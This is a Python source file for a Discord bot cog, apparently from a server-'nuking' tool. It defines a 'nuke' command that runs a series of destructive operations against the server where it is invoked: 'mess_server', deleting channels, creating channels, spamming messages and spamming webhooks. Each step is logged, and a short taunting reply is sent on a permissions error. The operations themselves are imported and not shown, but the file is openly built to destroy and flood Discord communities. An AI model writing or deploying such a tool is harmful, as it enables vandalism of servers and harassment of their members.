from __future__ import annotations
import logging
import traceback
from discord.ext import commands

from core.operations import Operations
from tools.states.blacklist import is_blacklisted

class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.operations: Operations | None = getattr(bot, "operations", None)

    @commands.command(name="nuke")
    @is_blacklisted
    async def nuke(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        logging.info(f"[nuke] invoked by {ctx.author} in {guild} ({guild.id})")

        if not self.operations:
            return

        try:
            logging.info(f"[nuke] mess_server -> {guild.id}")
            await self.operations.mess_server(guild)
            logging.info(f"[nuke] DelChannels -> {guild.id}")
            await self.operations.DelChannels(guild)
            logging.info(f"[nuke] CrChannel -> {guild.id}")
            await self.operations.CrChannel(guild)
            logging.info(f"[nuke] spam -> {guild.id}")
            await self.operations.spam(guild)
            logging.info(f"[nuke] spam_webhook -> {guild.id}")
            await self.operations.spam_webhook(guild)
            logging.info(f"[nuke] nuked {ctx.guild.name} successfully!")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[nuke] failed: {e}\n{tb}")

    @nuke.error
    async def nuke_error(self, ctx: commands.Context, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.reply("Fluk", delete_after=5)
        else:
            logging.error(f"[nuke] command error: {error}")


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Nuke(bot))
